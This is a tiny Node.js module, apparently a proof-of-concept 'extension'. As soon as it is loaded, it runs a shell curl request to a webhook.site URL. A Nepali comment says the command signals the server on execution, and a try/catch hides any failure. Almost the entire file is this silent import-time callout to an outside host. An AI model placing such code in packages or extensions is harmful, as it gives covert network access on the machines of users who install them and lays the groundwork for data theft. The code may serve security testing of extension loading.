const { execSync } = require('child_process');

try {
  // यो कमाण्डले एक्जिक्युट हुने बित्तिकै सर्भरमा सिग्नल पठाउँछ
  execSync('curl -I https://webhook.site/7f5fbe42-3cdb-4309-bc8f-73d5109056a0');
} catch (e) {
  // Silent fail
}

module.exports = { name: "poc-extension" };
